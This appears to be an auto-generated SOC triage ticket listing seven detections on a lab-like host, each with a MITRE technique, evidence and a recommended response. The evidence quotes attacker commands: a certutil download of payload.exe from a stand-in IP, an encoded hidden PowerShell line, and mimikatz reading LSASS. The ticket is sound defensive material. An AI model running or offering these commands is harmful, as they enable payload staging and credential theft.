# SOC Triage Ticket - Automated Detection Summary

**Generated:** 2026-06-03 10:01 UTC  
**Total detections:** 7  
**Severity breakdown:** Critical 1, High 4, Medium 2, Low 0

---

## 1. 🔴 [Critical] LSASS memory access (possible credential dump)

- **MITRE ATT&CK:** T1003.001 LSASS Memory
- **Host:** `WIN10-VICTIM`
- **User:** `WIN10-VICTIM\jdoe`
- **Evidence:** `C:\Tools\mimikatz.exe -> lsass.exe (GrantedAccess=0x1410)`
- **Recommended action:** Isolate host from network, capture memory image, force-reset any credentials that may have been cached, hunt for lateral movement.

## 2. 🟠 [High] Suspicious command line

- **MITRE ATT&CK:** T1059 Command/Scripting
- **Host:** `WIN10-VICTIM`
- **User:** `WIN10-VICTIM\jdoe`
- **Evidence:** `powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQA`
- **Recommended action:** Decode any encoded/base64 payload, identify the parent process, check the binary hash against VirusTotal, escalate if confirmed.

## 3. 🟠 [High] Suspicious command line

- **MITRE ATT&CK:** T1059 Command/Scripting
- **Host:** `WIN10-VICTIM`
- **User:** `WIN10-VICTIM\jdoe`
- **Evidence:** `certutil.exe -urlcache -split -f http://192.0.2.66/payload.exe C:\Users\Public\p.exe`
- **Recommended action:** Decode any encoded/base64 payload, identify the parent process, check the binary hash against VirusTotal, escalate if confirmed.

## 4. 🟠 [High] New Service Installed

- **MITRE ATT&CK:** T1543.003 Windows Service
- **Host:** `WIN10-VICTIM`
- **User:** `WIN10-VICTIM\jdoe`
- **Evidence:** `C:\Users\Public\AppData\evil.exe`
- **Recommended action:** Validate the service against change records, hash-check the binary, isolate the host if the service is unknown/unsigned.

## 5. 🟠 [High] Security Log Cleared

- **MITRE ATT&CK:** T1070.001 Clear Event Logs
- **Host:** `WIN10-VICTIM`
- **User:** `jdoe`
- **Evidence:** `The audit log was cleared.`
- **Recommended action:** Treat as high-confidence IoC. Pivot to forwarded logs / EDR which survive local log clears; begin formal incident response.

## 6. 🟡 [Medium] User Account Created

- **MITRE ATT&CK:** T1136 Create Account
- **Host:** `WIN10-VICTIM`
- **User:** `jdoe`
- **Evidence:** `svc_backup`
- **Recommended action:** Confirm a change ticket authorises the new account; if not, disable it and review what actions it performed.

## 7. 🟡 [Medium] Brute force - 6 failed logons

- **MITRE ATT&CK:** T1110 Brute Force
- **Host:** `-`
- **User:** `-`
- **Evidence:** `src_ip=192.0.2.66 failed_attempts=6`
- **Recommended action:** Block the source IP at the firewall, confirm no subsequent 4624 success, notify the account owner, enforce MFA.
